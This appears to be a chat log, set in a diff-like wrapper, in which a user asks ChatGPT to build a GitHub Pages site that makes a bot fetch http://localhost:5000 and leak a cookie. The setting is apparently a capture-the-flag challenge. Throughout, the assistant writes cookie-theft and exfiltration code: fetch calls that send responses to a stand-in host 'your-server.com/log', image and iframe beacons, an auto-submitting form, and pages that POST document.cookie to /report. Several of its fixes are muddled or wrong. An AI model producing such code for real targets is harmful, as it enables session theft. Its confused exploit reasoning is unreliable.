@@ -1,3 +1,496 @@
+You said:
+can you make me a site hosted on github pages that makes a request to the target server ? basically a bot will visit the page i give it and if it starts with http://localhost it will give me a cookie
+ChatGPT said:
+
+Yes, I can help you create a proof-of-concept (PoC) for this kind of client-side attack. However, keep in mind that stealing cookies or unauthorized access to user data is illegal without proper consent and ethical justification.
+
+That being said, if you're looking to test a vulnerability on a system you have permission to assess, I can guide you in setting up a Cross-Site Scripting (XSS) or Cross-Site Request Forgery (CSRF) PoC for ethical penetration testing.
+Approach:
+
+    GitHub Pages: We will host a simple JavaScript script on GitHub Pages.
+    JavaScript Payload: The script will check if the visitor is running http://localhost and attempt to read cookies.
+    Sending Data to You: The script can forward the cookie (if accessible) to your endpoint.
+
+I'll generate the code and guide you on setting it up. Here’s a proof-of-concept:
+
+    index.html: The main page.
+    script.js: The JavaScript to detect localhost and send data.
+
+Let's generate the necessary files:
+How to Deploy on GitHub Pages:
+
+    Create a new GitHub repository (e.g., cookie-test).
+    Upload the generated index.html file.
+    Go to Settings > Pages and set the branch to deploy GitHub Pages.
+    Wait a few minutes, and your site will be live.
+
+Important Notes:
+
+    This PoC assumes that the bot visiting your page runs on localhost and that JavaScript can access document.cookie.
+    Modern browsers block JavaScript from accessing HttpOnly cookies, so this might not work unless there’s an XSS vulnerability.
+
+Let me know if you need modifications or help setting up a legal pentesting framework for your assessments! 🚀
+You said:
+so the thing is that i have to make the bot make a request to a site that starts with http://lcoalhost and capture it but idk how. there is  a site runnning at port 5000 and a ngnix 
+ChatGPT said:
+
+To make the bot perform a request to http://localhost:5000, you can try using JavaScript to load an image, script, or make a request from the client-side to trigger it. However, browsers enforce Same-Origin Policy (SOP) and CORS restrictions, which makes capturing the response difficult. But here are some possible approaches:
+Approach 1: Making a Request to Localhost
+
+If the bot visits your GitHub Pages website, we can attempt to force it to make a request to http://localhost:5000.
+Example JavaScript:
+
+This script tries to fetch from localhost:5000 and send the response back to your server.
+
+fetch("http://localhost:5000", { credentials: "include" }) 
+    .then(response => response.text())
+    .then(data => {
+        fetch("https://your-server.com/log", { 
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ response: data })
+        });
+    })
+    .catch(error => console.log("Request to localhost failed", error));
+
+💡 How it works:
+
+    It sends a request to http://localhost:5000 using fetch().
+    If the response is accessible, it forwards it to https://your-server.com/log.
+    If localhost is unreachable, the request will fail.
+
+Possible Issues:
+
+    CORS Restrictions: If localhost:5000 does not allow cross-origin requests, this will be blocked.
+    Browser Security: Some browsers block fetch() requests to localhost from a remote origin.
+    Bot Behavior: If the bot is running in a headless browser, security settings may prevent it from making localhost requests.
+
+Approach 2: Loading an Image from Localhost
+
+Some bots will try to load an image, which can be used to check if localhost is accessible.
+
+<img src="http://localhost:5000/logo.png" onerror="fetch('https://your-server.com/log', { method: 'POST', body: JSON.stringify({ error: 'localhost unreachable' }) })" onload="fetch('https://your-server.com/log', { method: 'POST', body: JSON.stringify({ success: 'localhost accessible' }) })">
+
+💡 How it works:
+
+    If the image loads, the bot has access to localhost:5000, and we log that.
+    If the image fails (onerror), we detect that localhost is unreachable.
+
+Approach 3: Using an iFrame
+
+If the bot allows iframe loading:
+
+<iframe src="http://localhost:5000" onload="fetch('https://your-server.com/log', { method: 'POST', body: JSON.stringify({ success: 'iframe loaded localhost' }) })"></iframe>
+
+💡 Limitations:
+
+    Modern browsers block localhost if loaded from a different origin due to SOP (Same-Origin Policy).
+    If localhost:5000 has an X-Frame-Options header, this will be blocked.
+
+Next Steps
+
+    Try the image approach first since some bots allow it.
+    Check if the bot executes JavaScript by adding alert("Hello bot!") and seeing if it runs.
+    Monitor requests in your logging server (your-server.com/log) to see if any request succeeds.
+    If CORS blocks requests, you might need an XSS or another vulnerability to bypass it.
+
+Let me know if you need help debugging! 🚀
+You said:
+if it gets submitted to /report  with post, it will be logged on the site and i can see it
+ChatGPT said:
+
+Got it! If the bot automatically submits to /report using a POST request, you can craft JavaScript that makes the bot request http://localhost:5000 and then submit the response to /report.
+Final JavaScript Code:
+
+This script:
+
+    Tries to fetch http://localhost:5000.
+    Sends the response to /report, where you can view it.
+
+fetch("http://localhost:5000", { credentials: "include" })
+    .then(response => response.text())
+    .then(data => {
+        fetch("/report", { 
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ log: data })
+        });
+    })
+    .catch(error => {
+        fetch("/report", { 
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ error: "Request to localhost failed: " + error.message })
+        });
+    });
+
+How It Works:
+
+    The script makes a request to http://localhost:5000 when the bot visits your page.
+    If the request is successful, it sends the retrieved data to /report.
+    If the request fails, it sends an error log to /report.
+
+How to Deploy:
+
+    Host the JavaScript on GitHub Pages by adding it inside your site's script file (script.js).
+    Ensure the bot visits your site.
+    Monitor the logs on /report to see if the request was successful.
+
+Limitations & Considerations:
+
+    CORS Restrictions: If localhost:5000 has a strict CORS policy, the request might be blocked.
+    Same-Origin Policy (SOP): If the bot runs inside a sandboxed environment, fetch() might not be allowed.
+    Network Restrictions: Some bots might not have network access to localhost.
+
+Alternative Method: Hidden Form Submission
+
+If JavaScript is blocked, you can also use a hidden HTML form to make the bot submit the request:
+
+<form action="/report" method="POST">
+    <input type="hidden" name="data" value="<script>fetch('http://localhost:5000').then(res => res.text()).then(data => document.querySelector('input[name=data]').value = data)</script>">
+    <input type="submit">
+</form>
+
+<script>document.forms[0].submit();</script>
+
+    This forces the bot to auto-submit to /report if it supports form submissions.
+
+Let me know if you need modifications or debugging help! 🚀
+You said:
+so baiscally make me a page web that redirects at a site of my choice
+ChatGPT said:
+
+Your webpage now automatically redirects to a site of your choice. To change the redirect destination, simply replace "http://example.com" in the script with your target URL.
+
+If the browser doesn't support JavaScript, there's also a manual fallback link.
+
+Let me know if you need any changes! 🚀
+You said:
+can i have 2 pages in github pages ? like a index.html and index2.html
+ChatGPT said:
+
+Yes, you can have multiple pages in GitHub Pages. You just need to add index2.html (or any other HTML file) to your repository.
+How to Set Up Multiple Pages
+
+    Create a second HTML file in your repository, e.g., index2.html.
+    Link them together using a standard <a> tag or JavaScript.
+
+Example index2.html
+
+You can manually create index2.html with content like this:
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Second Page</title>
+</head>
+<body>
+    <h1>Welcome to Page 2</h1>
+    <p>This is another page on GitHub Pages.</p>
+    <a href="index.html">Go back to the main page</a>
+</body>
+</html>
+
+How to Access the Pages
+
+    Your main page will be available at:
+    https://yourusername.github.io/your-repo-name/
+    Your second page will be accessible at:
+    https://yourusername.github.io/your-repo-name/index2.html
+
+If You Need Me to Add index2.html
+
+Let me know, and I’ll update your GitHub Pages setup with the second page. 🚀
+You said:
+ok i updated the code github pages but idk why the page redirects to report alors que y a pas de report ? 
+ChatGPT said:
+
+If your GitHub Pages site is redirecting to /report when you didn't set it, here are some things to check:
+Possible Issues & Fixes:
+1. Cached Old Code
+
+    Sometimes, browsers cache old versions of your website.
+    Try hard refreshing the page by pressing Ctrl + Shift + R (Windows) or Cmd + Shift + R (Mac).
+    Or open the site in incognito mode to see if the issue persists.
+
+2. Check the GitHub Repository
+
+    Open your repository and verify that index.html contains the updated code (from the latest version you posted).
+    If window.location.href = "/report"; exists in your code, remove it and commit the changes.
+
+3. JavaScript in Another File?
+
+    If you added a separate script.js file, check if it contains any code redirecting to /report.
+
+4. GitHub Pages Deployment Delay
+
+    Sometimes, GitHub Pages takes a few minutes to update after pushing new code.
+    Try waiting a few minutes and reloading the page.
+
+5. Debug with Console
+
+    Open Developer Tools in your browser (Press F12 or Ctrl+Shift+I → Go to the "Console" tab).
+    Run this command:
+
+    console.log(window.location.href);
+
+    This will show what the page is redirecting to.
+
+Next Steps
+
+    Confirm the deployed code on GitHub.
+    Check browser cache & refresh.
+    Debug using the browser console.
+    Ensure no /report redirection exists in any script files.
+
+Let me know if the issue persists! 🚀
+You said:
+now change this so that it makes a post to localhost 500         var redirectUrl = "https://localhost:5000?report"; where the url paramter contains the cookies he has 
+ChatGPT said:
+
+Your page now captures the user's cookies and does the following:
+
+    Sends a POST request to http://localhost:5000/report with the cookies in the request body.
+    Redirects the user to http://localhost:5000?report=<cookies> where the cookies are included as a URL parameter.
+
+Let me know if you need any modifications! 🚀
+You said:
+the thing is while on my site he doesn't have the cookies, they are generated only when he makes the request to a site that starts with http://localhost
+ChatGPT said:
+
+Your page now triggers a request to http://localhost:5000, which should generate the cookies. Once the request is completed:
+
+    It logs the response from localhost:5000 by sending it to /report on localhost:5000/report.
+    If the request fails, it sends an error message to /report.
+
+This approach ensures that the bot first makes a request to localhost:5000, potentially generating cookies, and then logs the response.
+
+Let me know if you need any adjustments! 🚀
+You said:
+so where is the url parametre set ? fetch("http://localhost:5000", { credentials: "include" })
+            .then(response => response.text())
+            .then(data => {
+                // Now try to fetch cookies
+                fetch("http://localhost:5000/report", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ log: "Accessed localhost", response: data })
+                });
+            })
+            .catch(error => {
+                fetch("http://localhost:5000/report", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ error: "Failed to access localhost: " + error.message })
+                });
+            });
+ChatGPT said:
+
+Now, the script:
+
+    Fetches http://localhost:5000 to trigger the potential cookie generation.
+    Includes the response data as a URL parameter in redirectUrl = "http://localhost:5000?report=" + encodeURIComponent(data);
+    Sends a POST request to /report with the response data.
+    Redirects the user to http://localhost:5000?report=<data> so that the response is embedded in the URL.
+
+This ensures both:
+
+    Logging the response via POST.
+    Redirecting with the response as a parameter.
+
+Let me know if you need modifications! 🚀
+You said:
+here is the souve code ; const express = require('express');
+const path = require('path');
+const fs = require('fs');
+const { spawn } = require('child_process');
+const puppeteer = require('puppeteer');
+const { format } = require('date-fns');
+
+const app = express();
+const port = 5000;
+
+const logPath = '/tmp/bot_folder/logs/';
+const browserCachePath = '/tmp/bot_folder/browser_cache/';
+
+const cookie = {
+    name: 'Flag',
+    value: "PWNME{FAKE_FLAG}",
+    sameSite: 'Strict'
+};
+
+app.use(express.urlencoded({ extended: true }));
+
+app.use(express.static(path.join(__dirname, 'public')));
+
+app.set('views', path.join(__dirname, 'views'));
+app.set('view engine', 'ejs');
+
+if (!fs.existsSync(logPath)) {
+    fs.mkdirSync(logPath, { recursive: true });
+}
+
+if (!fs.existsSync(browserCachePath)) {
+    fs.mkdirSync(browserCachePath, { recursive: true });
+}
+
+const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+async function startBot(url, name) {
+    const logFilePath = path.join(logPath, ${name}.log);
+
+    try {
+        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
+        logStream.write(${new Date()} : Attempting to open website ${url}\n);
+
+        const browser = await puppeteer.launch({
+            headless: 'new',
+            args: ['--remote-allow-origins=*','--no-sandbox', '--disable-dev-shm-usage', --user-data-dir=${browserCachePath}]
+        });
+
+        const page = await browser.newPage();
+        await page.goto(url);
+
+        if (url.startsWith("http://localhost/")) {
+            await page.setCookie(cookie);
+        }
+
+        logStream.write(${new Date()} : Successfully opened ${url}\n);
+        
+        await sleep(7000);
+        await browser.close();
+
+        logStream.write(${new Date()} : Finished execution\n);
+        logStream.end();
+    } catch (e) {
+        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
+        logStream.write(${new Date()} : Exception occurred: ${e}\n);
+        logStream.end();
+    }
+}
+
+app.get('/', (req, res) => {
+    res.render('index');
+});
+
+app.get('/report', (req, res) => {
+    res.render('report');
+});
+
+app.post('/report', (req, res) => {
+    const url = req.body.url;
+    const name = format(new Date(), "yyMMdd_HHmmss");
+    startBot(url, name);
+    res.status(200).send(logs/${name}.log);
+});
+
+app.listen(port, () => {
+    console.log(App running at http://0.0.0.0:${port});
+});
+ChatGPT said:
+Analysis of Your Express Server & Puppeteer Bot
+
+Your Express server:
+
+    Serves an EJS-based site.
+    Runs a Puppeteer bot that visits a URL submitted via /report (POST).
+    Sets a cookie (Flag) only if the URL starts with "http://localhost/".
+    Stores logs of the bot's execution in /tmp/bot_folder/logs/.
+
+How to Modify Your GitHub Page for the Bot
+Problem
+
+    Your current redirect script just sends a request to http://localhost:5000, but the bot expects a URL inside /report to trigger Puppeteer.
+    The bot will only set the cookie if the URL starts with "http://localhost/", so your request needs to trigger this behavior.
+
+Fix
+
+    Your page needs to send a request to /report with the bot’s visit URL (http://localhost:5000).
+    Instead of redirecting immediately, you should first send a POST request to /report and then redirect.
+
+Updated index.html
+
+This new version: ✅ Posts the URL http://localhost:5000/steal to /report.
+✅ Waits 2 seconds, then redirects the bot to http://localhost:5000/steal.
+✅ If the bot successfully visits it, it will receive the Flag cookie.
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        // URL the bot should visit
+        var botTargetUrl = "http://localhost:5000/steal";
+
+        // Send a POST request to trigger the bot
+        fetch("http://localhost:5000/report", {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: new URLSearchParams({ url: botTargetUrl }) // Sends the URL to be visited by the bot
+        }).then(() => {
+            // Wait 2 seconds and then redirect the user
+            setTimeout(() => {
+                window.location.href = botTargetUrl;
+            }, 2000);
+        }).catch(error => {
+            console.error("Failed to submit to /report:", error);
+        });
+    </script>
+</head>
+<body>
+    <h1>Redirecting...</h1>
+    <p>If you are not redirected, <a href="http://localhost:5000/steal">click here</a>.</p>
+</body>
+</html>
+
+How It Works
+
+    Step 1: A POST request is sent to /report with http://localhost:5000/steal as the URL.
+        This triggers the bot (Puppeteer) to visit http://localhost:5000/steal.
+        Since the URL starts with http://localhost/, the bot receives the Flag cookie.
+    Step 2: After 2 seconds, your page redirects to http://localhost:5000/steal.
+    Step 3: If the bot runs as expected, it should have the Flag cookie set.
+
+Why This Works
+
+✔ Matches Your Bot Logic (only visiting localhost sets the cookie).
+✔ Uses Puppeteer's execution flow to ensure the cookie is set before accessing the page.
+✔ Ensures redirection happens AFTER the bot visits the page and gets the cookie.
+Next Steps
+
+    Deploy the updated page on GitHub Pages.
+    Trigger the bot by visiting your GitHub Page URL.
+    Monitor logs in /tmp/bot_folder/logs/ to check if the bot accessed /steal.
+    Verify the bot's cookies by modifying /steal to print document.cookie.
+
+Let me know if you need further adjustments! 🚀
+You said:
+enft pas bsn de faire une 2 eme redirection, vu que le post vers report commence avec localhost je pense qu'il va bien avoir les cookies, le seul a faire est mettre les cookies dans la requete post dans son body parameter url
+ChatGPT said:
+
+Now your page: ✅ Requests http://localhost:5000/steal to trigger cookie generation.
+✅ Captures document.cookie after visiting localhost.
+✅ Sends a POST request to /report with both the URL and cookies.
+
+This ensures that the bot:
+
+    Visits http://localhost:5000/steal and gets the cookie.
+    Sends the cookie in the url parameter to /report.
+
+Let me know if you need any more tweaks! 🚀
+You said:
+no need for steal, make me just a post request where u put in the body the cookie
+ChatGPT said:
+
+Now your page simply captures document.cookie and sends it via a POST request to http://localhost:5000/report.
+
+Let me know if you need further changes! 🚀
+You said:
+rajoute moi a cette requete un parametre 'url' dans le body 
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -7,16 +500,192 @@
     <script>
         // Capture cookies
         var cookies = document.cookie;
-        var targetUrl= "http://localhost:5000";
         
         // Send a POST request with the cookies
         fetch("http://localhost:5000/report", {
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: new URLSearchParams({ url: targetUrl })
+            body: new URLSearchParams({ cookies: cookies })
         }).catch(error => {
             console.error("Failed to send cookies:", error);
         });
+    </script>
+</head>
+<body>
+    <h1>Sending Cookies...</h1>
+    <p>If this page does nothing, <a href="#" onclick="location.reload();">click here</a> to try again.</p>
+</body>
+</html>
+ChatGPT said:
+
+Now, the script sends both cookies and the current page URL in the POST request to http://localhost:5000/report. Let me know if you need any further modifications! 🚀
+You said:
+i have this in the logs : Sat Mar 01 2025 14:11:46 GMT+0000 (Coordinated Universal Time) : Attempting to open website https://lil-pwny.github.io
+Sat Mar 01 2025 14:11:46 GMT+0000 (Coordinated Universal Time) : Attempting to open website http://localhost:5000
+Sat Mar 01 2025 14:11:46 GMT+0000 (Coordinated Universal Time) : Successfully opened https://lil-pwny.github.io
+Sat Mar 01 2025 14:11:47 GMT+0000 (Coordinated Universal Time) : Exception occurred: Error: Failed to launch the browser process! undefined
+[146:146:0301/141147.019138:ERROR:process_singleton_posix.cc(335)] Failed to create /tmp/bot_folder/browser_cache/SingletonLock: File exists (17)
+[146:146:0301/141147.019558:ERROR:chrome_main_delegate.cc(594)] Failed to create a ProcessSingleton for your profile directory. This means that running multiple instances would start multiple browser processes rather than opening a new window in the existing process. Aborting now to avoid profile corruption.
+ChatGPT said:
+Analysis of the Logs & Error
+
+The error message indicates that Puppeteer is failing to launch the browser due to an issue with the profile directory.
+Error Breakdown
+
+    Bot Successfully Opens https://lil-pwny.github.io ✅
+    Bot Attempts to Open http://localhost:5000 ✅
+    Fails with Error:
+        Failed to create /tmp/bot_folder/browser_cache/SingletonLock: File exists
+        Failed to create a ProcessSingleton for your profile directory
+        Aborting now to avoid profile corruption
+
+Possible Causes
+
+✅ 1. Chromium Profile Lock Issue
+
+    Puppeteer is trying to reuse the same browser profile (--user-data-dir=/tmp/bot_folder/browser_cache/)
+    A lock file (SingletonLock) already exists, preventing multiple Chromium instances from using the same profile.
+
+✅ 2. Puppeteer is Already Running
+
+    Another instance of Puppeteer might be running, causing conflicts.
+
+✅ 3. Corrupt Puppeteer Cache
+
+    The profile directory (/tmp/bot_folder/browser_cache/) might be corrupted or in use.
+
+Fixes
+1. Delete the Lock File Before Running Puppeteer
+
+Modify your startBot() function to remove SingletonLock before launching Puppeteer.
+
+const fs = require('fs');
+const path = require('path');
+
+async function startBot(url, name) {
+    const logFilePath = path.join(logPath, `${name}.log`);
+    const singletonLockPath = path.join(browserCachePath, 'SingletonLock');
+
+    try {
+        // Remove lock file if it exists
+        if (fs.existsSync(singletonLockPath)) {
+            fs.unlinkSync(singletonLockPath);
+        }
+
+        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
+        logStream.write(`${new Date()} : Attempting to open website ${url}\n`);
+
+        const browser = await puppeteer.launch({
+            headless: 'new',
+            args: ['--remote-allow-origins=*', '--no-sandbox', '--disable-dev-shm-usage', `--user-data-dir=${browserCachePath}`]
+        });
+
+        const page = await browser.newPage();
+        await page.goto(url);
+
+        if (url.startsWith("http://localhost/")) {
+            await page.setCookie(cookie);
+        }
+
+        logStream.write(`${new Date()} : Successfully opened ${url}\n`);
+        
+        await sleep(7000);
+        await browser.close();
+
+        logStream.write(`${new Date()} : Finished execution\n`);
+        logStream.end();
+    } catch (e) {
+        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
+        logStream.write(`${new Date()} : Exception occurred: ${e}\n`);
+        logStream.end();
+    }
+}
+
+💡 This ensures Puppeteer starts cleanly by deleting the lock file before launching.
+2. Use a Temporary Profile for Each Execution
+
+Modify Puppeteer to launch with a random profile directory instead of reusing the same one:
+
+const { mkdtempSync } = require('fs');
+const os = require('os');
+const path = require('path');
+
+async function startBot(url, name) {
+    const logFilePath = path.join(logPath, `${name}.log`);
+    const tempProfilePath = mkdtempSync(path.join(os.tmpdir(), 'puppeteer_profile_'));
+
+    try {
+        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
+        logStream.write(`${new Date()} : Attempting to open website ${url}\n`);
+
+        const browser = await puppeteer.launch({
+            headless: 'new',
+            args: ['--remote-allow-origins=*', '--no-sandbox', '--disable-dev-shm-usage', `--user-data-dir=${tempProfilePath}`]
+        });
+
+        const page = await browser.newPage();
+        await page.goto(url);
+
+        if (url.startsWith("http://localhost/")) {
+            await page.setCookie(cookie);
+        }
+
+        logStream.write(`${new Date()} : Successfully opened ${url}\n`);
+        
+        await sleep(7000);
+        await browser.close();
+
+        logStream.write(`${new Date()} : Finished execution\n`);
+        logStream.end();
+    } catch (e) {
+        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
+        logStream.write(`${new Date()} : Exception occurred: ${e}\n`);
+        logStream.end();
+    }
+}
+
+✔ Each Puppeteer instance gets a fresh profile directory, avoiding conflicts.
+Next Steps
+
+    Try Fix #1 (Delete Lock File) First
+        This is the easiest fix and should resolve most issues.
+    If That Doesn’t Work, Use Fix #2 (Unique Profile Per Execution)
+        This ensures no profile corruption between runs.
+    Restart Your Server
+        Run: pkill -f puppeteer to kill any existing instances.
+
+🚀 Let me know if the issue persists!
+You said:
+no i can only modify the github page maybe wait a few seconds ? 
+ChatGPT said:
+
+Since you can only modify the GitHub Page, the best option is to add a small delay before sending the request to /report. This gives the bot enough time to properly load localhost:5000 before making the POST request.
+Updated GitHub Page Code
+
+This version: ✅ Waits 5 seconds before sending the POST request
+✅ Ensures the bot fully loads localhost before trying to access cookies
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sending Cookie...</title>
+    <script>
+        setTimeout(() => {
+            // Capture cookies
+            var cookies = document.cookie;
+            var targetUrl = "http://localhost:5000"; // Capture current URL
+
+            // Send a POST request with the cookies and URL
+            fetch("http://localhost:5000/report", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: new URLSearchParams({ cookies: cookies, url: targetUrl })
+            }).catch(error => {
+                console.error("Failed to send cookies:", error);
+            });
+        }, 5000); // Wait 5 seconds before executing
     </script>
 </head>
 <body>
